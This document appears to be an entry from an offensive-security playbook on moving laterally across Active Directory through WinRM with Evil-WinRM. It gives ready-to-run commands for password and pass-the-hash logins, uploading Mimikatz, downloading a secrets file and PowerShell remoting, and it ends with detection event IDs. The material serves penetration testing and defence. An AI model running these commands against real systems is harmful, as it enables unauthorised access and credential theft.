---
title: "Attack #55 — WinRM Evil-WinRM Lateral Movement"
description: "Windows Remote Management (WinRM) is a SOAP-based protocol for remote management over HTTP/HTTPS (ports 5985/5986). Evil-WinRM provides an interactive…"
category: active-directory
subcategory: "Lateral Movement"
tags: ["active-directory", "lateral-movement"]
tools: ["Mimikatz", "Evil-WinRM", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #55 — WinRM Evil-WinRM Lateral Movement.md"
---
# ⚫ Attack #55 — WinRM / Evil-WinRM Lateral Movement

***

## 📖 How It Works

Windows Remote Management (WinRM) is a SOAP-based protocol for remote management over HTTP/HTTPS (ports 5985/5986). Evil-WinRM provides an interactive PowerShell shell over WinRM with built-in file upload/download, DLL loading, and PowerShell script execution capabilities. Users must be in the **Remote Management Users** group or have admin rights.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **WinRM enabled on target** | Port 5985 (HTTP) or 5986 (HTTPS) |
| **Admin or Remote Management Users** | Required for WinRM access |

***

## 💻 Full Commands

```bash
# ── Evil-WinRM with password ──────────────────────────────────────────────────
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1'

# ── PtH ───────────────────────────────────────────────────────────────────────
evil-winrm -i 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe

# ── With scripts directory ────────────────────────────────────────────────────
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1' -s /opt/tools/

# ── Upload/Download inside session ────────────────────────────────────────────
# upload /local/mimikatz.exe C:\Temp\mimikatz.exe
# download C:\Temp\secrets.txt /local/secrets.txt
```

```powershell
# ── Native PowerShell remoting ────────────────────────────────────────────────
Enter-PSSession -ComputerName TARGET -Credential CORP\Administrator
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential CORP\Administrator
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | Logon Type 3 via WinRM from unexpected source |
| **91** | Microsoft-Windows-WinRM/Operational | WinRM session created |
| **4688** | Security Log | wsmprovhost.exe spawning cmd/powershell |

***

> ✅ **Attack #55 — WinRM complete.**
